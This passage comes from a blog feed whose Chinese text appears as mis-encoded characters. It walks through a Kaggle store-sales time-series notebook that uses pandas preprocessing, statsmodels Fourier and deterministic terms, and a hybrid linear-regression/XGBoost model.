class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">test = pd.read_csv(<span class="string">&#x27;../input/store-sales-time-series-forecasting/test.csv&#x27;</span>, parse_dates=[<span class="string">&#x27;date&#x27;</span>])</span><br><span class="line">test[<span class="string">&#x27;unique_id&#x27;</span>] = test[<span class="string">&#x27;store_nbr&#x27;</span>].astype(<span class="built_in">str</span>) + <span class="string">&#x27;_&#x27;</span> + test[<span class="string">&#x27;family&#x27;</span>]</span><br><span class="line">X_df = assemble_df(test[[<span class="string">&#x27;unique_id&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>]], holidays, filled_oil)</span><br><span class="line">X_df.head()</span><br><span class="line"></span><br><span class="line">%time preds = mlf.predict(h=<span class="number">16</span>, X_df=X_df)</span><br><span class="line"></span><br><span class="line">subm = (</span><br><span class="line">    test</span><br><span class="line">    .merge(preds, on=[<span class="string">&#x27;unique_id&#x27;</span>, <span class="string">&#x27;date&#x27;</span>])</span><br><span class="line">    .drop(columns=<span class="string">&#x27;unique_id&#x27;</span>)</span><br><span class="line">    .rename(columns=&#123;<span class="string">&#x27;lgb&#x27;</span>: <span class="string">&#x27;sales&#x27;</span>&#125;)</span><br><span class="line">    [[<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>]]</span><br><span class="line">    .sort_values(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">)</span><br><span class="line">subm.to_csv(<span class="string">&#x27;submission.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br><span class="line">subm</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kaggle_warmup3-TimeSeries(2)</title>
      <link href="/2024/04/08/Kaggle-warmup3-TimeSeries-2/"/>
      <url>/2024/04/08/Kaggle-warmup3-TimeSeries-2/</url>
      
        <content type="html"><![CDATA[<p>ç»§ç»­ä¸Šæ¬¡çš„TimeSeriesé—®é¢˜,è¿™æ¬¡çœ‹çš„notebookæ˜¯å¦ä¸€ä¸ªäººå†™çš„<a href="https://www.kaggle.com/code/closen/experimenting-with-a-hybrid-model">hybridmodel</a></p><h2 id="preprocessing">preprocessing</h2><p>é¦–å…ˆå‰é¢æ•°æ®å¤„ç†å’Œè¡¨åˆå¹¶éƒ¨åˆ†å¤§åŒå°å¼‚. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.multioutput <span class="keyword">import</span> RegressorChain</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEncoder</span><br><span class="line"><span class="keyword">from</span> xgboost <span class="keyword">import</span> XGBRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.multioutput <span class="keyword">import</span> RegressorChain</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_log_error</span><br><span class="line"><span class="keyword">from</span> statsmodels.tsa.deterministic <span class="keyword">import</span> DeterministicProcess, CalendarFourier</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder</span><br><span class="line"><span class="comment"># Input data files are available in the read-only &quot;../input/&quot; directory</span></span><br><span class="line"><span class="comment"># For example, running this (by clicking run or pressing Shift+Enter) will list all files under the input directory</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> dirname, _, filenames <span class="keyword">in</span> os.walk(<span class="string">&#x27;/kaggle/input&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="built_in">print</span>(os.path.join(dirname, filename))</span><br><span class="line"></span><br><span class="line">comp_dir = Path(<span class="string">&#x27;../input/store-sales-time-series-forecasting&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Importing oil prices dataset</span></span><br><span class="line">oil_prices = pd.read_csv(<span class="string">&quot;/kaggle/input/store-sales-time-series-forecasting/oil.csv&quot;</span>,</span><br><span class="line">                         parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">                         infer_datetime_format=<span class="literal">True</span>)</span><br><span class="line">oil_prices[<span class="string">&#x27;date&#x27;</span>] = oil_prices.date.dt.to_period(<span class="string">&quot;D&quot;</span>)</span><br><span class="line">oil_prices.set_index(<span class="string">&#x27;date&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Importing holidays dataset</span></span><br><span class="line">holidays = pd.read_csv(<span class="string">&#x27;/kaggle/input/store-sales-time-series-forecasting/holidays_events.csv&#x27;</span>,</span><br><span class="line">                       parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">                       infer_datetime_format=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">holidays[<span class="string">&#x27;date&#x27;</span>] = holidays.date.dt.to_period(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">store_sales = pd.read_csv(</span><br><span class="line">    comp_dir / <span class="string">&#x27;train.csv&#x27;</span>,</span><br><span class="line">    usecols=[<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;onpromotion&#x27;</span>],</span><br><span class="line">    dtype=&#123;</span><br><span class="line">        <span class="string">&#x27;store_nbr&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;family&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sales&#x27;</span>: <span class="string">&#x27;float32&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;onpromotion&#x27;</span>: <span class="string">&#x27;uint32&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line">store_sales[<span class="string">&#x27;date&#x27;</span>] = store_sales.date.dt.to_period(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">store_sales = store_sales.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>]).sort_index()</span><br><span class="line"></span><br><span class="line">family_sales = (</span><br><span class="line">    store_sales</span><br><span class="line">    .groupby([<span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>],observed=<span class="literal">False</span>)</span><br><span class="line">    .mean()</span><br><span class="line">    .unstack(<span class="string">&#x27;family&#x27;</span>)</span><br><span class="line">    .loc[<span class="string">&#x27;2017&#x27;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = pd.read_csv(</span><br><span class="line">    comp_dir / <span class="string">&#x27;test.csv&#x27;</span>,</span><br><span class="line">    dtype=&#123;</span><br><span class="line">        <span class="string">&#x27;store_nbr&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;family&#x27;</span>: <span class="string">&#x27;category&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;onpromotion&#x27;</span>: <span class="string">&#x27;uint32&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    parse_dates=[<span class="string">&#x27;date&#x27;</span>],</span><br><span class="line">)</span><br><span class="line">test[<span class="string">&#x27;date&#x27;</span>] = test.date.dt.to_period(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">test = test.set_index([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>, <span class="string">&#x27;date&#x27;</span>]).sort_index()</span><br></pre></td></tr></table></figure> è¿™é‡Œä¸»è¦æ˜¯å¯¹æ—¶é—´ç±»å‹è¿›è¡Œè½¬æ¢,åŒæ—¶setä¸€ä¸‹index</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Splitting the holidays in three dataset on the basis of locale</span></span><br><span class="line">holidays_N = holidays[holidays.locale == <span class="string">&#x27;National&#x27;</span>]</span><br><span class="line"><span class="comment"># Dropping the locale column as we don&#x27;t need it anymore</span></span><br><span class="line">holidays_N.drop(<span class="string">&#x27;locale&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">holidays_N.drop_duplicates(subset=<span class="string">&#x27;date&#x27;</span>, keep=<span class="string">&#x27;first&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">holidays_N.set_index(<span class="string">&#x27;date&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">OH = OneHotEncoder(sparse=<span class="literal">False</span>)</span><br><span class="line">holidays_N_OH = pd.DataFrame(</span><br><span class="line">    OH.fit_transform(holidays_N[[<span class="string">&#x27;description&#x27;</span>]]), </span><br><span class="line">    index=holidays_N.index, </span><br><span class="line">    columns=OH.get_feature_names_out([<span class="string">&#x27;description&#x27;</span>])</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">full_train_data = store_sales.merge(holidays_N_OH, how=<span class="string">&#x27;left&#x27;</span>, left_index=<span class="literal">True</span>, right_index=<span class="literal">True</span>)</span><br><span class="line">full_train_data.fillna(<span class="number">0</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">full_train_data = full_train_data.merge(oil_prices, how=<span class="string">&#x27;left&#x27;</span>, left_index=<span class="literal">True</span>, right_index=<span class="literal">True</span>)</span><br><span class="line">full_train_data[<span class="string">&#x27;dcoilwtico&#x27;</span>].fillna(method=<span class="string">&#x27;ffill&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Create new columns</span></span><br><span class="line">date = full_train_data.index.get_level_values(<span class="string">&#x27;date&#x27;</span>)</span><br><span class="line">full_train_data[<span class="string">&#x27;week_day&#x27;</span>] = date.weekday</span><br><span class="line">full_train_data[<span class="string">&#x27;month_day&#x27;</span>] = date.day</span><br><span class="line">full_train_data[<span class="string">&#x27;year_day&#x27;</span>] = date.day_of_year</span><br><span class="line"></span><br><span class="line">full_train_data = full_train_data.fillna(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ—¶é—´è¿˜æ˜¯æŒ‰ç…§week,month,yearåšäº†åˆ—åˆ†å‰²,ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä½œè€…å¯¹holidayè¿›è¡Œäº†one_hot_encoding,æ‰€ä»¥åé¢æŸ¥çœ‹æ•°æ®ä¼šæœ‰70å¤šåˆ—. <img src="full_data.png" alt="full_data" /></p><h2 id="statsmodelsç›¸å…³">statsmodelsç›¸å…³</h2><p>å†åé¢ä½œè€…å†™äº†ä¸€ä¸ªhybridæ¨¡å‹,æœ‰ç‚¹æ®‹å·®ç½‘ç»œçš„æ„æ€,ä¸è¿‡è¿™ä¸ªå…ˆæ”¾ä¸€æ”¾,å…ˆçœ‹çœ‹<code>statsmodels.tsa.deterministic</code>çš„ç›¸å…³å†…å®¹,é¦–å…ˆæ˜¯<code>statsmodels.tsa.deterministic.CalendarFourier</code>,è¿™ä¸ªå‡½æ•°å¯ä»¥æŒ‰æ—¥å†ç”Ÿæˆç›¸å…³å‚…ç«‹å¶çº§æ•°. <img src="calendarFourier.png" alt="fourier" /></p><p>ä¸¾ä¸ªä¾‹å­ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fourier = CalendarFourier(freq=<span class="string">&quot;W&quot;</span>, order=<span class="number">2</span>)</span><br><span class="line">dp_train = DeterministicProcess(</span><br><span class="line">    index=y_train.index,</span><br><span class="line">    constant=<span class="literal">True</span>,</span><br><span class="line">    order=<span class="number">1</span>,</span><br><span class="line">    seasonal=<span class="literal">True</span>,</span><br><span class="line">    additional_terms=[fourier],</span><br><span class="line">    drop=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line">fourier.in_sample(y_train.index)[:<span class="number">20</span>]</span><br></pre></td></tr></table></figure> è¿™é‡Œçš„freqæˆ‘è®¾ç½®æˆäº†week,orderè®¾ä¸º2,é‚£ä¹ˆæ¯å‘¨ä¸€å›åˆ°å‘¨æœŸå¼€å§‹å°±ä¼šä»¤sinä¸º0,cosä¸º1.</p><p>è¿‡ä¸€å¤©åˆ°è¾¾å‘¨äºŒå°±ä¼šä»¤<code>$ \tau = 1$</code>, å³sinå€¼å˜ä¸º <code>$sin(order* \pi * \frac&#123;1&#125;&#123;7&#125;)$</code> , æ‰€ä»¥ä¹Ÿæœ‰äº†ä¸‹é¢è¿™äº›è®¡ç®—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.sin(<span class="number">0</span>)</span><br><span class="line"><span class="number">0.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.sin(math.pi*<span class="number">2</span>/<span class="number">7</span>)</span><br><span class="line"><span class="number">0.7818314824680298</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.sin(<span class="number">2</span>*math.pi*<span class="number">2</span>/<span class="number">7</span>)</span><br><span class="line"><span class="number">0.9749279121818236</span></span><br></pre></td></tr></table></figure><p><img src="weekFourier.png" /></p><p>ç„¶åæ˜¯<code>DeterministicProcess</code>çš„å¤„ç† <img src="deterministic.png" /></p><p>è¿™é‡ŒæŒ‡å®šäº†season,ç„¶åseasonæ˜¯ä¾æ®indexæ¥åˆ¤æ–­çš„ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.statsmodels.org/devel/_modules/statsmodels/tsa/deterministic.html#DeterministicProcess</span></span><br><span class="line"><span class="keyword">if</span> (seasonal <span class="keyword">or</span> fourier) <span class="keyword">and</span> period <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> period <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                self._period = period = freq_to_period(self._index_freq)</span><br></pre></td></tr></table></figure></p><p>å…¶ä¸­æˆ‘ä»¬çš„index_freqä¸ºday,è·³è½¬åˆ°freq_to_period <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.statsmodels.org/dev/_modules/statsmodels/tsa/tsatools.html</span></span><br><span class="line"><span class="keyword">if</span> freq <span class="keyword">in</span> (<span class="string">&quot;A&quot;</span>, <span class="string">&quot;Y&quot;</span>) <span class="keyword">or</span> freq.startswith(yearly_freqs):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;Q&quot;</span> <span class="keyword">or</span> freq.startswith((<span class="string">&quot;Q-&quot;</span>, <span class="string">&quot;QS&quot;</span>, <span class="string">&quot;QE&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;M&quot;</span> <span class="keyword">or</span> freq.startswith((<span class="string">&quot;M-&quot;</span>, <span class="string">&quot;MS&quot;</span>, <span class="string">&quot;ME&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">12</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;W&quot;</span> <span class="keyword">or</span> freq.startswith(<span class="string">&quot;W-&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">52</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">7</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;B&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> freq == <span class="string">&quot;H&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">24</span></span><br></pre></td></tr></table></figure></p><p>å³å¯å‘ç°æ˜¯ç›¸å½“äºperiodä¸º7çš„seasonal. ä¸è¿‡è¿™é‡Œfourierå¹¶æ²¡æœ‰ä½œä¸ºé¢å¤–é¡¹åŠ å…¥,ä¸ªäººä¹Ÿä¸å¤ªç†è§£å‡ºäºä»€ä¹ˆè€ƒè™‘. ç„¶åè·å–æ•°æ®åŠ ä¸¢å…¥æ¨¡å‹çš„ä»£ç å¦‚ä¸‹,æ•°æ®å¤„ç†è¿‡ç¨‹åˆ†æå¥½äº†å–‚æ•°æ®åè€Œç®€å•äº†.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linear Regression</span></span><br><span class="line"></span><br><span class="line">y_train = full_train_data.unstack([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>]).loc[<span class="string">&#x27;2016&#x27;</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create Training Data</span></span><br><span class="line">fourier = CalendarFourier(freq=<span class="string">&quot;D&quot;</span>, order=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dp_train = DeterministicProcess(</span><br><span class="line">    index=y_train.index,</span><br><span class="line">    constant=<span class="literal">True</span>,</span><br><span class="line">    order=<span class="number">1</span>,</span><br><span class="line">    seasonal=<span class="literal">True</span>,</span><br><span class="line">    additional_terms=[fourier],</span><br><span class="line">    drop=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">X_train = dp_train.in_sample()</span><br><span class="line">X_train[<span class="string">&#x27;NewYear&#x27;</span>] = (X_train.index.dayofyear == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model_LR = LinearRegression()</span><br><span class="line">model_LR.fit(X_train,y_train)</span><br><span class="line">y_pred_LR = pd.DataFrame(model_LR.predict(X_train), index=y_train.index, columns=y_train.columns)</span><br></pre></td></tr></table></figure><h2 id="prepare-training-data-for-hybrid-model">prepare training data for hybrid model</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For the first model :</span></span><br><span class="line"></span><br><span class="line">y = full_train_data.unstack([<span class="string">&#x27;store_nbr&#x27;</span>, <span class="string">&#x27;family&#x27;</span>]).loc[<span class="string">&#x27;2017&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fourier = CalendarFourier(freq=<span class="string">&#x27;D&#x27;</span>, order=<span class="number">4</span>)</span><br><span class="line">dp = DeterministicProcess(</span><br><span class="line">    index=y.index,</span><br><span class="line">    constant=<span class="literal">True</span>,</span><br><span class="line">    order=<span class="number">1</span>,</span><br><span class="line">    seasonal=<span class="literal">True</span>,</span><br><span class="line">    additional_terms=[fourier],</span><br><span class="line">    drop=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line">X_1 = dp.in_sample()</span><br><span class="line">X_1[<span class="string">&#x27;NewYear&#x27;</span>] = (X_1.index.dayofyear == <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the second model :</span></span><br><span class="line"></span><br><span class="line">X_2 = y.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">X_2 = X_2.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">X_2 = X_2.reset_index()</span><br><span class="line">X_2.set_index(<span class="string">&#x27;date&#x27;</span>, inplace = <span class="literal">True</span>)</span><br><span class="line">X_2[<span class="string">&#x27;day&#x27;</span>] = X_2.index.dayofweek</span><br><span class="line"><span class="keyword">for</span> colname <span class="keyword">in</span> X_2.select_dtypes([<span class="string">&quot;object&quot;</span>, <span class="string">&quot;category&quot;</span>]):</span><br><span class="line">    X_2[colname], _ = X_2[colname].factorize()</span><br><span class="line">X_2 = X_2.drop(<span class="string">&#x27;sales&#x27;</span>, axis =<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="hybrid-model">hybrid model</h2><p>åˆ°è¿™é‡Œæˆ‘ä»¬å†å›è¿‡å¤´çœ‹æœ€ç»ˆé¢„æµ‹çš„æ¨¡å‹çš„ç»“æ„, è¿™é‡Œçœ‹åˆ°æ¨¡å‹1åšå¯¹yçš„é¢„æµ‹, æ¨¡å‹2åœ¨å¾—åˆ°yå’Œy_predä¹‹å,å¯¹å…¶å·®å€¼è¿›è¡Œé¢„æµ‹,å³æˆ‘ä¹‹å‰è¯´çš„æœ‰ç‚¹åƒæ®‹å·®ç½‘ç»œ. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_lags</span>(<span class="params">ts, lags, lead_time=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">return</span> pd.concat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">f&#x27;y_lag_<span class="subst">&#123;i&#125;</span>&#x27;</span>: ts.shift(i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(lead_time, lags + lead_time)</span><br><span class="line">        &#125;,</span><br><span class="line">        axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_multistep_target</span>(<span class="params">ts, steps</span>):</span><br><span class="line">    <span class="keyword">return</span> pd.concat(</span><br><span class="line">        &#123;<span class="string">f&#x27;y_step_<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>&#x27;</span>: ts.shift(-i)</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(steps)&#125;,</span><br><span class="line">        axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Compute RMSLE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rmsle</span>(<span class="params">y_true, y_pred</span>):</span><br><span class="line">    <span class="keyword">return</span> np.sqrt(mean_squared_log_error(y_true, y_pred))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BoostedHybrid</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, model_1, model_2</span>):</span><br><span class="line">        self.model_1 = model_1</span><br><span class="line">        self.model_2 = model_2</span><br><span class="line">        self.y_columns = <span class="literal">None</span>  <span class="comment"># store column names from fit method</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">self, y,X_1, X_2</span>):</span><br><span class="line"></span><br><span class="line">        self.model_1.fit(X_1, y)</span><br><span class="line">        y_fit = pd.DataFrame(</span><br><span class="line">            <span class="comment"># YOUR CODE HERE: make predictions with self.model_1</span></span><br><span class="line">            self.model_1.predict(X_1),</span><br><span class="line">            index=X_1.index, columns=y.columns,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        y_fit = y_fit.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">        y_fit =y_fit.stack(future_stack=<span class="literal">True</span>)</span><br><span class="line">        y_fit =y_fit.reset_index()</span><br><span class="line">        y_fit[<span class="string">&#x27;sales&#x27;</span>] = y_fit[<span class="string">&#x27;sales&#x27;</span>].astype(<span class="string">&#x27;int64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        y_bis = y.stack(future_stack=<span 